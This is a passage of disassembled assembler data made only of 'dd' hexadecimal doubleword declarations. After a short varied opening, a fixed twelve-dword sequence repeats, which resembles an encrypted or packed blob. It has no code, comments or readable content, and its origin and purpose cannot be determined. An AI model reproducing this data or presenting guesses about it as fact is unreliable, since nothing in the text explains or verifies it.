		dd 6CE26D81h, 0A00A05C6h, 9AC7010Ah, 66BEF114h,	0C94F3A60h
		dd 6DF47A3Ah, 0AC56C85Ch, 755791A8h, 302F6877h,	4A912B4Bh
		dd 59DE2CD0h, 67D0D30Bh, 6477447Fh, 223E1B7Ch, 9B72C250h
		dd 86530A33h, 0B6DF3F9h, 0A0BB4919h, 62D5DA3h, 0DD9E78FDh
		dd 8217913Dh, 0CCC62E1Dh, 0DE9D6EB1h, 0CE3C3B04h, 0BBD837FDh
		dd 0E689B010h, 5C8A10BEh, 6FB1DE6Bh, 79825FC1h,	0E6382FEEh
		dd 1C843489h, 0D61A0467h, 0E47D8536h, 0FA30BD8Ch, 0D9422C66h
		dd 7402CB53h, 9F6C120Fh, 4DB566ADh, 3AD3D3ACh, 53AD084Eh
		dd 0FC1117A8h, 0B5B2E6C5h, 89459800h, 3B6FD782h, 1B73FB65h
		dd 83627F98h, 0B24CAFE4h, 0F3228D1Bh, 0D7C25D4Fh, 2AE2BB78h
		dd 0AC7AAAFCh, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
